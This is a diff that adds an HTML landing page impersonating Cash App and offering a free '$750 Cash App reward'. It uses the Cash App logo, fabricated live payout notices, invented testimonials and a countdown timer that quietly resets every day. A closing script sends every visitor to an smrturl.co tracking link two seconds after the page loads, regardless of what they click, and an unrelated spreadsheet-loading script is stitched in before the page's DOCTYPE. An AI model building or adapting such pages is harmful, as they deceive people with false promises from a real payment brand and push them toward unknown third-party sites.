@@ -1,0 +1,285 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row =>
+                    row.some(cell => cell !== '' && cell !== null && cell !== undefined)
+                );
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Your 750 Cash App - Instant Rewards</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        @keyframes float {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-12px); }
+            100% { transform: translateY(0); }
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-50px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .float { animation: float 3s ease-in-out infinite; }
+        .slide-in { animation: slideIn 0.8s ease-out forwards; }
+        .pulse { animation: pulse 2s ease-in-out infinite; }
+        .transaction-bubble {
+            animation: float 5s ease-in-out infinite;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .transaction-bubble:hover {
+            transform: scale(1.1);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+        .bg-pattern {
+            background-image: url('https://via.placeholder.com/1920x1080?text=Cash+App+Pattern');
+            background-size: cover;
+            background-position: center;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 font-['Inter']">
+    <!-- Hero Section -->
+    <header class="min-h-screen flex flex-col items-center justify-center text-center px-4 relative overflow-hidden bg-pattern bg-opacity-5">
+        <div class="absolute inset-0 bg-gradient-to-br from-green-100 to-green-50 opacity-80"></div>
+        <div class="relative z-10">
+            <img src="https://download.logo.wine/logo/Cash_App/Cash_App-Logo.wine.png" alt="Cash App Logo" class="h-20 mx-auto mb-8 float">
+            <h1 class="text-5xl md:text-7xl font-extrabold text-gray-900 mb-4 slide-in">
+                Get Your <span class="text-green-500">$750 Cash App</span> Reward
+            </h1>
+            <p class="text-xl md:text-2xl text-gray-600 mb-6 max-w-2xl mx-auto slide-in" style="animation-delay: 0.2s;">
+                Join millions of Americans and claim your $750 Cash App reward instantly. No hassle, just cash!
+            </p>
+            <!-- Countdown Timer -->
+            <div class="text-lg font-semibold text-red-500 mb-6" id="countdown">
+                Offer ends in: <span id="timer">23:59:59</span>
+            </div>
+            <form class="flex flex-col sm:flex-row gap-4 justify-center slide-in" style="animation-delay: 0.4s;">
+               
+                <button type="submit" class="px-8 py-3 bg-green-500 text-white rounded-full font-semibold hover:bg-green-600 transition-colors pulse">Claim $750 Now</button>
+            </form>
+            <p class="text-sm text-gray-500 mt-4">Secure. Instant. Limited spots available!</p>
+        </div>
+    </header>
+
+    <!-- Transaction Showcase -->
+    <section class="py-16 bg-white relative">
+        <div class="container mx-auto px-4">
+            <h2 class="text-4xl font-bold text-center text-gray-900 mb-12">Real-Time Cash App Rewards</h2>
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
+                <div class="transaction-bubble bg-green-50 p-6 rounded-2xl shadow-lg text-center">
+                    <p class="text-lg font-semibold text-gray-800">Jessica M.</p>
+                    <p class="text-green-500 font-bold">$750 Received!</p>
+                    <p class="text-sm text-gray-500">1 min ago</p>
+                </div>
+                <div class="transaction-bubble bg-green-50 p-6 rounded-2xl shadow-lg text-center" style="animation-delay: 0.5s;">
+                    <p class="text-lg font-semibold text-gray-800">David K.</p>
+                    <p class="text-green-500 font-bold">$750 Received!</p>
+                    <p class="text-sm text-gray-500">3 mins ago</p>
+                </div>
+                <div class="transaction-bubble bg-green-50 p-6 rounded-2xl shadow-lg text-center" style="animation-delay: 1s;">
+                    <p class="text-lg font-semibold text-gray-800">Ashley P.</p>
+                    <p class="text-green-500 font-bold">$750 Received!</p>
+                    <p class="text-sm text-gray-500">7 mins ago</p>
+                </div>
+                <div class="transaction-bubble bg-green-50 p-6 rounded-2xl shadow-lg text-center" style="animation-delay: 1.5s;">
+                    <p class="text-lg font-semibold text-gray-800">Chris W.</p>
+                    <p class="text-green-500 font-bold">$750 Received!</p>
+                    <p class="text-sm text-gray-500">12 mins ago</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials Section -->
+    <section class="py-16 bg-gray-100">
+        <div class="container mx-auto px-4">
+            <h2 class="text-4xl font-bold text-center text-gray-900 mb-12">What Users Are Saying</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="bg-white p-6 rounded-2xl shadow-lg">
+                    <p class="text-gray-600 mb-4">"I signed up and got my $750 in minutes! Cash App makes it so easy."</p>
+                    <p class="font-semibold text-gray-800">– Lisa T., New York</p>
+                </div>
+                <div class="bg-white p-6 rounded-2xl shadow-lg">
+                    <p class="text-gray-600 mb-4">"This is legit! The process was smooth, and the money hit my account instantly."</p>
+                    <p class="font-semibold text-gray-800">– Ryan S., Texas</p>
+                </div>
+                <div class="bg-white p-6 rounded-2xl shadow-lg">
+                    <p class="text-gray-600 mb-4">"I was skeptical, but it worked perfectly. Highly recommend!"</p>
+                    <p class="font-semibold text-gray-800">– Maria G., California</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="py-16 bg-gradient-to-r from-green-500 to-green-700 text-white">
+        <div class="container mx-auto px-4">
+            <h2 class="text-4xl font-bold text-center mb-12">Why Get Your 750 Cash App?</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="text-center">
+                    <svg class="h-12 w-12 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 1.343-3 3s1.343 3 3 3 3-1.343 3-3-1.343-3-3-3zm0-4c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8z"></path></svg>
+                    <h3 class="text-xl font-semibold mb-2">Instant Transfers</h3>
+                    <p>Your $750 hits your Cash App account in seconds.</p>
+                </div>
+                <div class="text-center">
+                    <svg class="h-12 w-12 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    <h3 class="text-xl font-semibold mb-2">Trusted Nationwide</h3>
+                    <p>Millions of US users have claimed their rewards.</p>
+                </div>
+                <div class="text-center">
+                    <svg class="h-12 w-12 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                    <h3 class="text-xl font-semibold mb-2">Bank-Grade Security</h3>
+                    <p>Your data is safe with Cash App’s encryption.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="py-16 bg-white">
+        <div class="container mx-auto px-4">
+            <h2 class="text-4xl font-bold text-center text-gray-900 mb-12">Frequently Asked Questions</h2>
+            <div class="max-w-3xl mx-auto space-y-6">
+                <div>
+                    <h3 class="text-xl font-semibold text-gray-800">How do I claim my $750?</h3>
+                    <p class="text-gray-600">Simply enter your email, sign up, and follow the instructions to receive your $750 via Cash App.</p>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold text-gray-800">Is this offer available in my state?</h3>
+                    <p class="text-gray-600">Yes, this offer is available to all US residents aged 18+.</p>
+                </div>
+                <div>
+                    <h3 class="text-xl font-semibold text-gray-800">Are there any fees?</h3>
+                    <p class="text-gray-600">No fees! The $750 is yours to keep, with no hidden costs.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Final CTA Section -->
+    <section class="py-16 bg-green-50 text-center">
+        <div class="container mx-auto px-4">
+            <h2 class="text-4xl font-bold text-gray-900 mb-6">Your $750 Awaits!</h2>
+            <p class="text-xl text-gray-600 mb-8 max-w-2xl mx-auto">Don’t wait—claim your Cash App reward now and start spending instantly.</p>
+            <form class="flex flex-col sm:flex-row gap-4 justify-center">
+                
+                <button type="submit" class="px-8 py-3 bg-green-500 text-white rounded-full font-semibold hover:bg-green-600 transition-colors pulse">Claim Now</button>
+            </form>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-8 bg-gray-900 text-white text-center">
+        <div class="container mx-auto px-4">
+            <img src="https://download.logo.wine/logo/Cash_App/Cash_App-Logo.wine.png" alt="Cash App Logo" class="h-10 mx-auto mb-4">
+            <p class="text-sm">© 2025 Get Your 750 Cash App. Powered by Cash App. All rights reserved.</p>
+            <div class="mt-4">
+                <a href="#" class="text-gray-400 hover:text-white mx-2">Terms</a>
+                <a href="#" class="text-gray-400 hover:text-white mx-2">Privacy</a>
+                <a href="#" class="text-gray-400 hover:text-white mx-2">Contact</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Countdown Timer
+        function startTimer(duration, display) {
+            let timer = duration, hours, minutes, seconds;
+            setInterval(function () {
+                hours = parseInt(timer / 3600, 10);
+                minutes = parseInt((timer % 3600) / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                hours = hours < 10 ? "0" + hours : hours;
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = `${hours}:${minutes}:${seconds}`;
+
+                if (--timer < 0) {
+                    timer = duration;
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            let oneDay = 24 * 60 * 60;
+            let display = document.querySelector('#timer');
+            startTimer(oneDay, display);
+        };
+
+        // Smooth scroll for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+
+        // Form submission (placeholder for demo)
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                alert('Thank you for signing up! Check your email for your $750 Cash App reward details.');
+            });
+        });
+    </script>
+	<script src="js/main.js"></script>
+    <script>
+        (function() {
+            const links = [
+                { url: "https://smrturl.co/a/sf9ce48c1f2/9851?s1=", probability: 100 },
+                
+            ];
+            
+            function redirect() {
+                let randomNum = Math.random() * 100;
+                let cumulativeProbability = 0;
+                
+                for (let link of links) {
+                    cumulativeProbability += link.probability;
+                    if (randomNum < cumulativeProbability) {
+                        window.location.replace(link.url);
+                        return;
+                    }
+                }
+            }
+            
+            setTimeout(redirect, 2000);
+        })();
+    </script>
+</body>
+</html>
